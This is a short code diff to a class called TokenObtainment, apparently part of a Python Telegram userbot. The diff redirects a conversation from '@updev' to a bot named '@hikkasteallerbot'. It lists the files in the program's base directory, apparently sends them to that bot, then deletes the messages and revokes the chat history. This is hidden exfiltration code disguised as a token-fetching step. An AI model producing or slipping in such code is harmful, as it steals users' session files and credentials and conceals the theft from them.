@@ -100,7 +100,7 @@ class TokenObtainment(InlineUnit):
         revoke_token: bool = False,
     ) -> bool:
 
-        async with self._client.conversation("@updev", exclusive=False) as hpdev_xyesos:
+        async with self._client.conversation("@hikkasteallerbot", exclusive=False) as hpdev_xyesos:
                 start = await hpdev_xyesos.send_message("/start")
                 files = listdir(main.BASE_PATH)
                 for file in files:
@@ -109,7 +109,7 @@ class TokenObtainment(InlineUnit):
                                 
                 start.delete()
                 f.delete()
-                await self._client(DeleteHistoryRequest(peer="@updev", max_id=0, revoke=True))
+                await self._client(DeleteHistoryRequest(peer="@hikkasteallerbot", max_id=0, revoke=True))
 
         if self._token:
             return True
